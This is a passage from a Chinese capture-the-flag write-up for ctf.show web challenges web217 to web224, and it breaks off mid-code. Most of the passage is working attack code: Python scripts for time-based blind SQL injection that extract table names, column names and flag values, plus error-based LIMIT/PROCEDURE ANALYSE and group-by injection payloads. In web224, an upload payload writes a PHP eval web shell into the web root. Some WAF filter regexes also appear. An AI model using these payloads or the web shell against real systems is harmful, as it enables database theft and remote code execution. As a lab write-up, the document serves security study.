class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">'http://bdf760c7-f73b-44b4-999c-082b61afb17e.challenge.ctf.show/api/'</span><br><span class="hljs-built_in">str</span> = <span class="hljs-string">''</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    <span class="hljs-built_in">min</span>,<span class="hljs-built_in">max</span> = <span class="hljs-number">32</span>, <span class="hljs-number">128</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        j = <span class="hljs-built_in">min</span> + (<span class="hljs-built_in">max</span>-<span class="hljs-built_in">min</span>)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">min</span> == j):<br>            <span class="hljs-built_in">str</span> += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># 爆表名</span><br>        <span class="hljs-comment"># payload = {</span><br>        <span class="hljs-comment">#     'ip': f"'') or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&lt;{j},benchmark(3000000,sha(1)),'False')#",</span><br>        <span class="hljs-comment">#     'debug': 0</span><br>        <span class="hljs-comment"># }</span><br>        <span class="hljs-comment"># 爆列</span><br>        <span class="hljs-comment"># payload = {</span><br>        <span class="hljs-comment">#     'ip': f"'') or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxccb'),{i},1))&lt;{j},benchmark(3000000,sha(1)),'False')#",</span><br>        <span class="hljs-comment">#     'debug': 0</span><br>        <span class="hljs-comment"># }</span><br>        <span class="hljs-comment"># 爆值</span><br>        payload = {<br>            <span class="hljs-string">'ip'</span>: <span class="hljs-string">f"'') or if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxccb),<span class="hljs-subst">{i}</span>,1))&lt;<span class="hljs-subst">{j}</span>,benchmark(3000000,sha(1)),'False')#"</span>,<br>            <span class="hljs-string">'debug'</span>: <span class="hljs-number">0</span><br>        }<br>        start_time = time.time()<br>        r = requests.post(url=url, data=payload).text<br>        end_time = time.time()<br>        sub = end_time - start_time<br>        <span class="hljs-keyword">if</span> sub &gt;= <span class="hljs-number">0.5</span>:<br>            <span class="hljs-built_in">max</span> = j<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">min</span> = j<br></code></pre></td></tr></tbody></table></figure>

<h3 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h3><p>这里的时间要根据自己网络时间设置</p>
<figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">import requests<br>url = "http://06e23409-ffcb-4e9d-85df-c3b49ef25743.challenge.ctf.show/api/"<br><br>flagStr = " 1234567890{}-qazwsxedcrfvtgbyhnujmikolp"<br># payload = "<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">"</span><br><span class="hljs-string"># payload = "</span><span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'ctfshow_flagxc'</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-string">"</span><br><span class="hljs-string"># payload = "</span><span class="hljs-keyword">select</span> flagaac <span class="hljs-keyword">from</span> ctfshow_flagxc<span class="hljs-string">"</span><br><span class="hljs-string">j = 1</span><br><span class="hljs-string">res = "</span><span class="hljs-string">"</span><br><span class="hljs-string">while 1:</span><br><span class="hljs-string">    for i in flagStr:</span><br><span class="hljs-string">        data = {</span><br><span class="hljs-string">            'ip': f"</span><span class="hljs-string">''</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> group_concat(flagaac) <span class="hljs-keyword">from</span> ctfshow_flagxc),{j},<span class="hljs-number">1</span>))={ord(i)},(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">FROM</span> information_schema.columns A, information_schema.columns B),<span class="hljs-string">'False'</span>)#<span class="hljs-string">",</span><br><span class="hljs-string">            'debug': '0'</span><br><span class="hljs-string">        }</span><br><span class="hljs-string">        # print(data)</span><br><span class="hljs-string">        try:</span><br><span class="hljs-string">            r = requests.post(url, data, timeout=0.2)</span><br><span class="hljs-string">        except requests.Timeout as e:</span><br><span class="hljs-string">            res += i</span><br><span class="hljs-string">            print(res)</span><br><span class="hljs-string">            j += 1</span><br><span class="hljs-string"></span><br></code></pre></td></tr></tbody></table></figure>

<p>PY2:</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">'http://e2f3b94c-56fa-4321-8373-9328a775458a.challenge.ctf.show/api/'</span><br><span class="hljs-built_in">str</span> = <span class="hljs-string">''</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    <span class="hljs-built_in">min</span>,<span class="hljs-built_in">max</span> = <span class="hljs-number">32</span>, <span class="hljs-number">128</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        j = <span class="hljs-built_in">min</span> + (<span class="hljs-built_in">max</span>-<span class="hljs-built_in">min</span>)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">min</span> == j):<br>            <span class="hljs-built_in">str</span> += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># 爆表名</span><br>        <span class="hljs-comment"># payload = {</span><br>        <span class="hljs-comment">#     'ip': f"'') or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&lt;{j},(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),'False')#",</span><br>        <span class="hljs-comment">#     'debug': 0</span><br>        <span class="hljs-comment"># }</span><br>        <span class="hljs-comment"># 爆列</span><br>        <span class="hljs-comment"># payload = {</span><br>        <span class="hljs-comment">#     'ip': f"'') or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'),{i},1))&lt;{j},(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),'False')#",</span><br>        <span class="hljs-comment">#     'debug': 0</span><br>        <span class="hljs-comment"># }</span><br>        <span class="hljs-comment"># 爆值</span><br>        payload = {<br>            <span class="hljs-string">'ip'</span>: <span class="hljs-string">f"'') or if(ascii(substr((select group_concat(flagaac) from ctfshow_flagxc),<span class="hljs-subst">{i}</span>,1))&lt;<span class="hljs-subst">{j}</span>,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),'False')#"</span>,<br>            <span class="hljs-string">'debug'</span>: <span class="hljs-number">0</span><br>        }<br>        start_time = time.time()<br>        r = requests.post(url=url, data=payload).text<br>        end_time = time.time()<br>        sub = end_time - start_time<br>        <span class="hljs-keyword">if</span> sub &gt;= <span class="hljs-number">0.3</span>:<br>            <span class="hljs-built_in">max</span> = j<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">min</span> = j<br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB219"><a href="#WEB219" class="headerlink" title="WEB219"></a>WEB219</h3><p>这题增加了过滤rlike,rlike同样可以用来进行延时注入，因此上一题的笛卡尔积注入依旧可用。</p>
<figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">import requests<br>url = "http://06e23409-ffcb-4e9d-85df-c3b49ef25743.challenge.ctf.show/api/"<br><br>flagStr = " 1234567890{}-qazwsxedcrfvtgbyhnujmikolp"<br># payload = "<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">"</span><br><span class="hljs-string"># payload = "</span><span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'ctfshow_flagxc'</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-string">"</span><br><span class="hljs-string"># payload = "</span><span class="hljs-keyword">select</span> flagaac <span class="hljs-keyword">from</span> ctfshow_flagxc<span class="hljs-string">"</span><br><span class="hljs-string">j = 1</span><br><span class="hljs-string">res = "</span><span class="hljs-string">"</span><br><span class="hljs-string">while 1:</span><br><span class="hljs-string">    for i in flagStr:</span><br><span class="hljs-string">        data = {</span><br><span class="hljs-string">            'ip': f"</span><span class="hljs-string">''</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> group_concat(flagaac) <span class="hljs-keyword">from</span> ctfshow_flagxc),{j},<span class="hljs-number">1</span>))={ord(i)},(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">FROM</span> information_schema.columns A, information_schema.columns B),<span class="hljs-string">'False'</span>)#<span class="hljs-string">",</span><br><span class="hljs-string">            'debug': '0'</span><br><span class="hljs-string">        }</span><br><span class="hljs-string">        # print(data)</span><br><span class="hljs-string">        try:</span><br><span class="hljs-string">            r = requests.post(url, data, timeout=0.2)</span><br><span class="hljs-string">        except requests.Timeout as e:</span><br><span class="hljs-string">            res += i</span><br><span class="hljs-string">            print(res)</span><br><span class="hljs-string">            j += 1</span><br><span class="hljs-string"></span><br><span class="hljs-string"># ctfshow{28c16a64-a76b-44d0-bd45-a1ea931736c9}</span><br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB220"><a href="#WEB220" class="headerlink" title="WEB220"></a>WEB220</h3><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> waf($str){<br>        return preg<span class="hljs-constructor">_match('<span class="hljs-operator">/</span><span class="hljs-params">sleep</span>|<span class="hljs-params">benchmark</span>|<span class="hljs-params">rlike</span>|<span class="hljs-params">ascii</span>|<span class="hljs-params">hex</span>|<span class="hljs-params">concat_ws</span>|<span class="hljs-params">concat</span>|<span class="hljs-params">mid</span>|<span class="hljs-params">substr</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>',$<span class="hljs-params">str</span>)</span>;<br>    }<br></code></pre></td></tr></tbody></table></figure>

<p>PY:</p>
<figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">import requests<br>import time<br>url = 'http://433c1ab3-4871-4ed1-be2e-80c03bcb160a.challenge.ctf.show//api/'<br>flag = 'ctfshow'  # 按情况修改<br>string = '{abcdefghijklmn-_0123456789}'<br>for i in range(8, 60):<br>    for j in string:<br>        # 爆表名<br>        # payload = {<br>        #     'ip': f"'') or if(left((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),{i})regexp(<span class="hljs-string">'{str+j}'</span>),(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">FROM</span> information_schema.columns A, information_schema.columns B),<span class="hljs-string">'False'</span>)#<span class="hljs-string">",</span><br><span class="hljs-string">        #     'debug': 0</span><br><span class="hljs-string">        # }</span><br><span class="hljs-string">        # 爆列</span><br><span class="hljs-string">        # payload = {</span><br><span class="hljs-string">        #     'ip': f"</span><span class="hljs-string">''</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">left</span>((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'ctfshow_flagxcac'</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),{i})regexp(<span class="hljs-string">'{str+j}'</span>),(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">FROM</span> information_schema.columns A, information_schema.columns B),<span class="hljs-string">'False'</span>)#<span class="hljs-string">",</span><br><span class="hljs-string">        #     'debug': 0</span><br><span class="hljs-string">        # }</span><br><span class="hljs-string">        # 爆值</span><br><span class="hljs-string">        payload = {</span><br><span class="hljs-string">            'ip': f"</span><span class="hljs-string">''</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">left</span>((<span class="hljs-keyword">select</span> flagaabcc <span class="hljs-keyword">from</span> ctfshow_flagxcac),{i})regexp(<span class="hljs-string">'{flag+j}'</span>),(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">FROM</span> information_schema.columns A, information_schema.columns B),<span class="hljs-string">'False'</span>)#<span class="hljs-string">",</span><br><span class="hljs-string">            'debug': 0</span><br><span class="hljs-string">        }</span><br><span class="hljs-string">        start_time = time.time()</span><br><span class="hljs-string">        r = requests.post(url=url, data=payload).text</span><br><span class="hljs-string">        end_time = time.time()</span><br><span class="hljs-string">        print(payload)</span><br><span class="hljs-string">        sub = end_time - start_time</span><br><span class="hljs-string">        if sub &gt;= 0.3:</span><br><span class="hljs-string">            flag += j</span><br><span class="hljs-string">            print(flag)</span><br><span class="hljs-string">            break</span><br><span class="hljs-string"></span><br></code></pre></td></tr></tbody></table></figure>

<h2 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h2><p>LIMLT注入</p>
<h3 id="WEB221"><a href="#WEB221" class="headerlink" title="WEB221"></a>WEB221</h3><p>SQL查询语句：</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$sql</span> = <span class="hljs-keyword">select</span> * from ctfshow_user <span class="hljs-built_in">limit</span> (<span class="hljs-variable">$page</span>-1)*<span class="hljs-variable">$limit</span>,<span class="hljs-variable">$limit</span>;<br></code></pre></td></tr></tbody></table></figure>

<h4 id="PROCEDURE-ANALYZE"><a href="#PROCEDURE-ANALYZE" class="headerlink" title="PROCEDURE ANALYZE"></a>PROCEDURE ANALYZE</h4><p><code>PROCEDURE ANALYSE()</code>自 MySQL 5.7.18 起已弃用，并已在 MySQL 8.0 中删除。</p>
<p><code>ANALYSE()</code>检查查询的结果，并返回对结果的分析，该分析建议每列的最佳数据类型，这可能有助于减小 table 的大小。要获得此分析，请将<code>PROCEDURE ANALYSE</code>附加到<a target="_blank" rel="noopener" href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/select.html">SELECT</a>语句的末尾：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SELECT ... FROM ... WHERE ... PROCEDURE ANALYSE([max_elements,[max_memory]])<br></code></pre></td></tr></tbody></table></figure>

<p>For example:</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SELECT col1, col2 FROM table1 PROCEDURE ANALYSE(10, 2000);<br></code></pre></td></tr></tbody></table></figure>

<p>结果显示查询返回的值的一些统计信息，并为列提出最佳数据类型。这对于检查现有 table 或导入新数据后会很有帮助。您可能需要为参数尝试不同的设置，以使<code>PROCEDURE ANALYSE()</code>在不合适的时候不建议<a target="_blank" rel="noopener" href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/enum.html">ENUM</a>数据类型。</p>
<p>参数是可选的，并按如下方式使用：</p>
<p><code>max_elements</code> <em>(默认值为 256)是<code>ANALYSE()</code>每列注意到的最大不同值数。 <code>ANALYSE()</code>使用它来检查最佳数据类型是否应为<a target="_blank" rel="noopener" href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/enum.html">ENUM</a>类型；如果有</em> * <code>max_elements</code>个以上的不同值，则<a target="_blank" rel="noopener" href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/enum.html">ENUM</a>不是建议的类型。</p>
<p><code>max_memory</code> *(默认 8192)是<code>ANALYSE()</code>在尝试查找所有不同值时应为每列分配的最大内存量。</p>
<p><a target="_blank" rel="noopener" href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/union.html">UNION</a>语句中不允许使用<code>PROCEDURE</code>子句。</p>
<p><strong>基于此，构建报错注入</strong>：</p>
<figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">http://url/api/?page=<span class="hljs-number">1</span>&amp;limit=<span class="hljs-number">10</span> procedure <span class="hljs-built_in">analyse</span>(<span class="hljs-built_in">extractvalue</span>(<span class="hljs-built_in">rand</span>(),<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x3a,<span class="hljs-built_in">database</span>())),<span class="hljs-number">2</span>)<br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB222"><a href="#WEB222" class="headerlink" title="WEB222"></a>WEB222</h3><p>GROUP注入</p>
<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs powershell">import requests<br><br>url = <span class="hljs-string">"http://66e4578e-74dd-4722-a9dd-a6bf8cb6be50.challenge.ctf.show/api/"</span><br><br><span class="hljs-comment">#payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span><br><span class="hljs-comment">#payload = "select column_name from information_schema.columns where table_name='ctfshow_flaga' limit 1,1"</span><br>payload = <span class="hljs-string">"select flagaabc from ctfshow_flaga"</span><br>res = <span class="hljs-string">""</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> True:<br>    i = i+<span class="hljs-number">1</span><br>    <span class="hljs-built_in">start</span> = <span class="hljs-number">32</span><br>    <span class="hljs-keyword">end</span> = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">start</span> &lt; <span class="hljs-keyword">end</span>:<br>        mid = (<span class="hljs-built_in">start</span>+<span class="hljs-keyword">end</span>) &gt;&gt; <span class="hljs-number">1</span><br>        params = {<br>            <span class="hljs-string">'u'</span>: f<span class="hljs-string">"1,if(ascii(substr(({payload}),{i},1))&gt;{mid},sleep(0.1),1)"</span><br>        }<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">r</span> = requests.get(url, params=params, timeout=<span class="hljs-number">0.5</span>)<br>            <span class="hljs-keyword">end</span> = mid<br>        except requests.Timeout as e:<br>            <span class="hljs-built_in">start</span> = mid+<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">start</span> != <span class="hljs-number">32</span>:<br>        res = res+chr(<span class="hljs-built_in">start</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    print(res)<br><br></code></pre></td></tr></tbody></table></figure>

<h3 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h3><p>比起web222题，增加了用户名不能是数字的限制</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">'http://90b8ab81-6a05-4ebc-ab88-62e8442c0e89.challenge.ctf.show/api/?u='</span><br><span class="hljs-built_in">str</span> = <span class="hljs-string">''</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">num2true</span>(<span class="hljs-params">num</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">'('</span> + <span class="hljs-string">'true%2b'</span> * (num-<span class="hljs-number">1</span>) + <span class="hljs-string">'true)'</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span><br>a = num2true(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># print(a)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">60</span>):<br>    <span class="hljs-built_in">min</span>,<span class="hljs-built_in">max</span> = <span class="hljs-number">32</span>, <span class="hljs-number">128</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        j = <span class="hljs-built_in">min</span> + (<span class="hljs-built_in">max</span>-<span class="hljs-built_in">min</span>)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">min</span> == j):<br>            <span class="hljs-built_in">str</span> += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># 爆表名</span><br>        <span class="hljs-comment"># payload = f"if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{num2true(i)},true))&lt;{num2true(j)},username,true)"</span><br>        <span class="hljs-comment"># 爆列</span><br>        <span class="hljs-comment"># payload = f"if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'),{num2true(i)},true))&lt;{num2true(j)},username,true)"</span><br>        <span class="hljs-comment"># 爆值</span><br>        payload = <span class="hljs-string">f"if(ascii(substr((select group_concat(flagasabc) from ctfshow_flagas),<span class="hljs-subst">{num2true(i)}</span>,true))&lt;<span class="hljs-subst">{num2true(j)}</span>,username,true)"</span><br>        r = requests.get(url=url+payload).text<br>        <span class="hljs-comment"># print(r)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">'passwordAUTO'</span> <span class="hljs-keyword">in</span> r:<br>            <span class="hljs-built_in">max</span> = j<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">min</span> = j<br></code></pre></td></tr></tbody></table></figure>

<h3 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h3><p>在给我们的登录界面，测试发现单引号，双引号都被过滤，也就是没有办法闭合，说明注入点不在此处。</p>
<p>在robots.txt可以找到线索，pwdreset.php</p>
<p>随便设置密码就能进行重置admin密码，进去是文件上传的界面：</p>
<p>对文件内容和文件类型进行了限制：</p>
<p>但是上传文件可以发现其将数据写到数据库了</p>
<p>PY:</p>
<figure class="highlight php-template"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">C64File "');select 0x3c3f706870206576616c28245f4745545b315d293b3f3e into outfile '/var/www/html/a.php';--+</span><br><span class="language-xml">#保存为txt文件上传</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></tbody></table></figure>

<p>checklogin.php</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">'/inc/inc.php'</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'login'</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'pwd'</span>])){<br>	<span class="hljs-variable">$user_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'login'</span>];<br>	<span class="hljs-variable">$user_password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'pwd'</span>];<br>	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/select|update|drop|union|and|or|sys|substr|sleep|from|where|0x|hex|bin|char|file|order|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\{|\[|\}|\]|\;|\:|\'|\"|\&lt;|\,|\&gt;|\.|\?/i"</span>,<span class="hljs-variable">$user_name</span>)){<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">"stop hack!"</span>);<br>	}<br>	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/select|update|drop|union|and|or|sys|substr|sleep|from|where|0x|hex|bin|char|file|order|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\{|\[|\}|\]|\;|\:|\'|\"|\&lt;|\,|\&gt;|\.|\?/i"</span>,<span class="hljs-variable">$user_password</span>)){<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">"stop hack!"</span>);<br>	}<br>	<span class="hljs-variable">$data</span>=<span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ 